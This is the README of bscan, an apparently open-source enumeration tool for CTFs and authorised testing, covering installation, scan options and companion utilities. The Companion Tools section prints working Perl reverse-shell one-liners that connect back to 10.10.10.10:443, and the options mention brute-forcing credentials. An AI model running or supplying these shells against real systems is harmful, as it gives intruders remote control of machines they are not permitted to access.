<p align="center">
  <img width="350" height="200" src="https://raw.githubusercontent.com/welchbj/bscan/master/static/logo.png" alt="bscan">
</p>
<p align="center">
  :mag: <em>an asynchronous target enumeration tool</em> :mag_right:
</p>
<p align="center">
  <a href="https://travis-ci.org/welchbj/bscan">
    <img src="https://img.shields.io/travis/welchbj/bscan/master.svg?style=flat-square&label=travis" alt="travis status">
  </a>
  <a href="https://pypi.org/project/bscan/">
    <img src="https://img.shields.io/pypi/v/bscan.svg?style=flat-square&label=pypi" alt="pypi">
  </a>
  <a href="https://www.kali.org/">
    <img src="https://img.shields.io/badge/built%20for-kali-2a98ed.svg?style=flat-square" alt="built for kali linux">
  </a>
  <a href="https://www.python.org/">
    <img src="https://img.shields.io/badge/python-3.6+-b042f4.svg?style=flat-square" alt="python version">
  </a>
</p>
<p align="center">
  <a href="https://asciinema.org/a/205992?autoplay=1&speed=3">
    <img src="https://asciinema.org/a/205992.png" width="750"/>
  </a>
</p>

---

## Synopsis

`bscan` is a command-line utility to perform active information gathering and service enumeration. At its core, `bscan` asynchronously spawns processes of well-known scanning utilities, repurposing scan results into highlighted console output and a well-defined directory structure.


## License

`bscan` is intended for educational purposes and events such as CTFs only and should never be run on machines and/or networks without explicit prior consent. This code is released under the [MIT license](https://opensource.org/licenses/MIT).


## Installation

`bscan` was written to be run on [Kali Linux](https://www.kali.org/), but there is nothing inherently preventing it from running on any OS with the appropriate tools installed.

Download the latest packaged version from PyPI:
```sh
pip install bscan
```

Or get the bleeding-edge version from version control:
```sh
pip install https://github.com/welchbj/bscan/archive/master.tar.gz
```


## Basic Usage

`bscan` has a wide variety of configuration options which can be used to tune scans to your needs. Here's a quick example:
```sh
$ bscan \
> --max-concurrency 3 \
> --patterns [Mm]icrosoft \
> --status-interval 10 \
> --verbose-status \
> scanme.nmap.org
```

What's going on here?
* `--max-concurrency 3` means that no more than 3 concurrent scan subprocesses will be run at a time
* `--patterns [Mm]icrosoft` defines a custom regex pattern with which to highlight matches in the generated scan output
* `--status-interval 10` tells `bscan` to print runtime status updates every 10 seconds
* `--verbose-status` means that each of these status updates will print details of all currently-running scan subprocesses
* `scanme.nmap.org` is the host upon which we want to enumerate

`bscan` also relies on some additional configuration files. The default files can be found in the [`bscan/configuation`](bscan/configuration) directory and serve the following purposes:
* [`patterns.txt`](bscan/configuration/patterns.txt) specifies the regex patterns to be highlighted in console output when matched with scan output
* [`required-programs.txt`](bscan/configuration/required-programs.txt) specifies the installed programs that `bscan` plans on using
* [`port-scans.toml`](bscan/configuration/port-scans.toml) defines the port-discovering scans to be run on the target(s), as well as the regular expressions used to parse port numbers and service names from scan output
* [`service-scans.toml`](bscan/configuration/service-scans.toml) defines the scans be run on the target(s) on a per-service basis

`bscan` also ships with a helper program `bscan-wordlists`, which can be used to list available wordlists on your system. Here's a simple example:
```sh
$ bscan-wordlists --find "*win*"
/usr/share/wordlists/wfuzz/vulns/dirTraversal-win.txt
/usr/share/wordlists/metasploit/sensitive_files_win.txt
/usr/share/seclists/Passwords/common-passwords-win.txt
```

To print all wordlists found on your system, use `bscan-wordlists --list`.


## Detailed Options

Here's what you should see when running `bscan --help`:
```
usage: bscan [OPTIONS] targets

 _
| |__  ___  ___ __ _ _ __
| '_ \/ __|/ __/ _` | '_ \
| |_) \__ \ (__ (_| | | | |
|_.__/|___/\___\__,_|_| |_|

an asynchronous service enumeration tool

positional arguments:
  targets               the targets and/or networks on which to perform enumeration

optional arguments:
  -h, --help            show this help message and exit
  --brute-pass-list F   filename of password list to use for brute-forcing
  --brute-user-list F   filename of user list to use for brute-forcing
  --cmd-print-width I   the maximum integer number of characters allowed when printing
                        the command used to spawn a running subprocess (defaults to 80)
  --config-dir D        the base directory from which to load the configuration files;
                        required configuration files missing from this directory will
                        instead be loaded from the default files shipped with this
                        program
  --hard                force overwrite of existing directories
  --max-concurrency I   maximum integer number of subprocesses permitted to be running
                        concurrently (defaults to 20)
  --no-program-check    disable checking the presence of required system programs
  --no-file-check       disable checking the presence of files such as configured
                        wordlists
  --no-service-scans    disable running scans on discovered services
  --output-dir D        the base directory in which to write output files
  --patterns [ [ ...]]  regex patterns to highlight in output text
  --ping-sweep          enable ping sweep filtering of hosts from a network range
                        before running more intensive scans
  --quick-only          whether to only run the quick scan (and not include the
                        thorough scan over all ports)
  --qs-method S         the method for performing the initial TCP port scan; must
                        correspond to a configured port scan
  --status-interval I   integer number of seconds to pause in between printing status
                        updates; a non-positive value disables updates (defaults to 30)
  --ts-method S         the method for performing the thorough TCP port scan; must
                        correspond to a configured port scan
  --udp                 whether to run UDP scans
  --udp-method S        the method for performing the UDP port scan; must correspond
                        to a configured port scan
  --verbose-status      whether to print verbose runtime status updates, based on
                        frequency specified by `--status-interval` flag
  --version             program version
  --web-word-list F     the wordlist to use for scans
```


## Companion Tools

The main `bscan` program ships with two utility programs (`bscan-wordlists` and `bscan-shells`) to make your life a little easier when looking for wordlists and trying to open reverse shells.

`bscan-wordlists` is a program designed for finding wordlist files on Kali Linux. It searches a few default directories and allows for glob filename matching. Here's a simple example:
```sh
$ bscan-wordlists --find "*win*"
/usr/share/wordlists/wfuzz/vulns/dirTraversal-win.txt
/usr/share/wordlists/metasploit/sensitive_files_win.txt
/usr/share/seclists/Passwords/common-passwords-win.txt
```
Try `bscan-wordlists --help` to explore other options.

`bscan-shells` is a program that will generate a variety of reverse shell one-liners with `target` and `port` fields populated for you. Here's a simple example to list all Perl-based shells, configured to connect back to `10.10.10.10` on port `443`:
```sh
$ bscan-shells --port 443 10.10.10.10 | grep -i -A1 perl
perl for windows
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

perl with /bin/sh
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl without /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.10.10:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
Note that `bscan-shells` pulls these commands from the [`reverse-shells.toml`](bscan/configuration/reverse-shells.toml) configuration file. Try `bscan-shells --help` to explore other options.


## Development

Start by setting up a new development environment and installing the requirements (using [`virtualenvwrapper`](https://pypi.org/project/virtualenvwrapper/) / [`virtualenvwrapper-win`](https://pypi.org/project/virtualenvwrapper-win/)):
```sh
# setup the environment
mkvirtualenv -p $(which python3) bscan-dev
workon bscan-dev

# get the deps
pip install -r dev-requirements.txt
```

Lint and type-check the project (these are run on [Travis](./.travis.yml), too):
```sh
flake8 . && mypy bscan
```

When it's time to package a new release:
```sh
# build source and wheel distributions
python setup.py bdist_wheel sdist

# run post-build checks
twine check dist/*

# upload to PyPI
twine upload dist/*
```
